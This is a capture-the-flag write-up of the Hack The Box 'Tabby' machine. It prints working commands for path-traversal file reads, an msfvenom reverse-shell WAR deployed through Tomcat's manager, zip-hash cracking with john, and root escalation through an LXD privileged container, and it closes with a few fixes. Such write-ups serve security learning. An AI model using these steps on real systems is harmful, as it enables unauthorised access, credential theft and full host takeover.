# Tabby

```
root@kali:/home/kali/htb/Tabby# nmap -p- -sV -sC 10.129.117.161 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-21 19:16 EDT
Nmap scan report for 10.129.117.161
Host is up (0.028s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
```

I check the links on the webserver, and see that the point to megahosting.htb so I add that to my /etc/hosts file.

The 8080 webserver links to the admin panel, and cancelling out of the pop-up login gives a default login of tomcat:s3cret which does not work.


On megahosting.htb/news.php?file=statement page it says:

```
We apologise to all our customers for the previous data breach.

We have changed the site to remove this tool, and have invested heavily in more secure servers
```

I want to see if we can get some LFI with this page.

I try: `http://megahosting.htb/news.php?file=../../../../../etc/passwd`

and get:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash 
```

Thats bad. I note the page I got from the failed admin login earlier:

`please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.`

I google and it seems the conf/tomcat-users.xml file is installed to CATALINA_HOME/conf/tomcat-users.xml

where CATALINA_HOME is the tomcat installation directory. I google some more and see: `By default, CATALINA_HOME is /usr/share/tomcat6, and CATALINA_BASE is /var/lib/tomcat6.`

Now I know from the installation successfull that we are running tomcat 9, so I try /usr/share/tomcat9, but it does not work.

I struggle for a bit, until I try to view the page source because I was looking for news.php. which I did not have to do on the passwd file. But everything could be commented out

`view-source:http://megahosting.htb/news.php?file=../news.php`

gives me:

```
<?php
$file = $_GET['file'];
$fh = fopen("files/$file","r");
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>
```

And `view-source:http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml`

Gives the creds: tomcat:$3cureP4s5w0rd123!

I log onto the Host manager panel.

I google how to upload a .WAR file via the tomcat api and find this:

`curl --upload-file appplication-0.1-1.war "http://tomcat:tomcat@localhost:8080/manager/deploy?path=/application-0.1-1`


```
root@kali:/home/kali/htb/Tabby# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.51 LPORT=1337 -f war > god_of.war
Payload size: 1497 bytes
```

`curl --upload-file god_of.war "http://tomcat:$3cureP4s5w0rd123!@megahosting.htb:8080/manager/deploy?path=/god_of"`


I try this:

```
root@kali:/home/kali/htb/Tabby# curl --upload-file god_of.war "http://tomcat:$3cureP4s5w0rd123\!@megahosting.htb:8080/manager/html/deploy?path=/god_of"
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>401 Unauthorized</title>
  <style type="text/css">
    <!--
    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
    PRE, TT {border: 1px dotted #525D76}
    A {color : black;}A.name {color : black;}
    -->
  </style>
 </head>
 <body>
   <h1>401 Unauthorized</h1>
   <p>
    You are not authorized to view this page. If you have not changed
    any configuration files, please examine the file
    <tt>conf/tomcat-users.xml</tt> in your installation. That
    file must contain the credentials to let you use this webapp.
   </p>
   <p>
    For example, to add the <tt>manager-gui</tt> role to a user named
    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
    config file listed above.
   </p>
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
   <p>
    Note that for Tomcat 7 onwards, the roles required to use the manager
    application were changed from the single <tt>manager</tt> role to the
    following four roles. You will need to assign the role(s) required for
    the functionality you wish to access.
   </p>
    <ul>
      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
          pages</li>
      <li><tt>manager-script</tt> - allows access to the text interface and the
          status pages</li>
      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
          pages</li>
      <li><tt>manager-status</tt> - allows access to the status pages only</li>
    </ul>
   <p>
    The HTML interface is protected against CSRF but the text and JMX interfaces
    are not. To maintain the CSRF protection:
   </p>
   <ul>
    <li>Users with the <tt>manager-gui</tt> role should not be granted either
        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
        testing since these interfaces are intended for tools not humans) then
        the browser must be closed afterwards to terminate the session.</li>
   </ul>
   <p>
    For more information - please see the
    <a href="/docs/manager-howto.html" rel="noopener noreferrer">Manager App How-To</a>.
   </p>
 </body>

</html>
```

but it seems the authorization failed. I fiddle around a bit and eventually get it:


```
root@kali:/home/kali/htb/Tabby# curl -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file god_of.war 'http://megahosting.htb:8080/manager/text/deploy?path=/test/godofwar'
curl: (28) Failed to connect to megahosting.htb port 8080: Connection timed out
```

but then it timed out...

I then took a look at my msfvenom command. And it turns out I had filetype raw, not war. I can't even script kiddie right...

```
root@kali:/home/kali/htb/Tabby# curl -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file god_of.war 'http://megahosting.htb:8080/manager/text/deploy?path=/skiddie/gow'
OK - Deployed application at context path [/skiddie/gow]
root@kali:/home/kali/htb/Tabby# 
```

And then on the listener:

```
root@kali:/home/kali/htb/Tabby# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.117.161 50964
whoami
tomcat
script /dev/null -c bash
Script started, file is /dev/null
tomcat@tabby:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -nlvp 1337
root@kali:/home/kali/htb/Tabby# stty raw -echo
nc -nlvp 1337me/kali/htb/Tabby# fg
             reset
reset: unknown terminal type unknown
Terminal type? xterm
tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ export SHELL=bash
tomcat@tabby:/var/lib/tomcat9$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat@tabby:/var/lib/tomcat9$ 
```

I upload linpeas to enumerate the machine.

it finds some backup files:

```
[+] Backup files?
-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip  
```

Even though the system has unzip, I cannot unzip as it needs a password. And I could not transfer it via curl.

I encrypted it with base64 -w0, copied the result and decrypted it on my local machine.

```
root@kali:/home/kali/htb/Tabby# zip2john backup.zip 
backup.zip/var/www/html/assets/ is not encrypted!
ver 1.0 backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
ver 1.0 backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
ver 2.0 efh 5455 efh 7875 backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
backup.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:backup.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
root@kali:/home/kali/htb/Tabby# vim backup_hash
root@kali:/home/kali/htb/Tabby# john backup_hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (backup.zip)
1g 0:00:00:00 DONE (2021-03-22 00:41) 1.052g/s 10908Kp/s 10908Kc/s 10908KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:/home/kali/htb/Tabby# 

```

I don't find anything interesting after unzipping, so I try the password to log in as user ash.

```
tomcat@tabby:/tmp$ su ash
Password: 
ash@tabby:/tmp$ 
ash@tabby:/tmp$ 
ash@tabby:/tmp$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:/tmp$ sudo -l
sudo: unable to open /run/sudo/ts/ash: Read-only file system
[sudo] password for ash: 
Sorry, user ash may not run sudo on tabby.
ash@tabby:/tmp$ 
```

So ash is member of 4 adm, 30 dip, 46 plugdev, and 116 lxd.

I google exploits for all of these. And hacktricks actually has a page for lxd: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

That doesn't work for me so I find this instead https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md

and I also used this: https://github.com/lxc/distrobuilder

The commands I ran are:

[On my local machine]

```
root@kali:/home/kali/htb/Tabby# sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools git

In order to get the requirements like go.


root@kali:/home/kali/htb/Tabby# go get -d -v github.com/lxc/distrobuilder/distrobuilder

the lxc distrobuilder

root@kali:/home/kali/htb/Tabby# cd $HOME/go/src/github.com/lxc/distrobuilder
root@kali:~/go/src/github.com/lxc/distrobuilder# make

going to the distrobuilder install and using the makefile to install everything.

root@kali:~/go/src/github.com/lxc/distrobuilder# mkdir -p $HOME/ContainerImages/alpine/
root@kali:~/go/src/github.com/lxc/distrobuilder# cd $HOME/ContainerImages/alpine/
root@kali:~/ContainerImages/alpine# wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

create a directory for the image etc. and download the yaml configuration file

root@kali:~/ContainerImages/alpine# sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

Specify the build image release

root@kali:~/ContainerImages/alpine# python -m SimpleHTTPServer 80

starting up a webserver to upload the image.

[On the target machine]

ash@tabby:~$ wget http://10.10.14.51/rootfs.squashfs
--2021-03-22 05:10:19--  http://10.10.14.51/rootfs.squashfs
Connecting to 10.10.14.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2015232 (1.9M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   1.92M  6.28MB/s    in 0.3s    

2021-03-22 05:10:19 (6.28 MB/s) - ‘rootfs.squashfs’ saved [2015232/2015232]

ash@tabby:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

Download both the files. and import them into lxc

ash@tabby:~$ lxd init

Initializing lxd, just letting all the settings stay as default

ash@tabby:~$ lxc init alpine privesc -c security.privileged=true

Creating privesc container

ash@tabby:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc

mounting the alpine and adding the current device root to it.

ash@tabby:~$ lxc start privesc

starting it

ash@tabby:~$ lxc exec privesc /bin/sh

executing bin shell with the lxc powers.
~ # whoami
root
~ # cd /mnt/root/root
/mnt/root/root # 

```

And we can cd via mnt.


## Comparing myself with the official writeup:

They find the megahosting.htb domain and add it to /etc/hosts

This leads them to the LFI at the news.php site

they find the manager page on the 8080 port and then find the tomcat-users.xml via the LFI

they use wfuzz to enumerate the /manager page and find the text interface. 

they deploy a malicious war file and get reverse shell.

they find the backup zip file and copy it using base64.

they then use fcrackzup to crack the password.

and get the user ash.

they find the lxd group and use the privileged container to get root.

They further import their own ssh  key in order to ssh in as root.


## How to stop this exploit:

The news.php file is prone to LFI. This should be fixed by sanitizing the input of the passed argument.

Some bad password reuse on the zip file. Which does not need to be password protected in the first place, as it does not contain any important information.

giving the user ash group lxd is essentially giving root. And giving a normal user root is very bad practice. 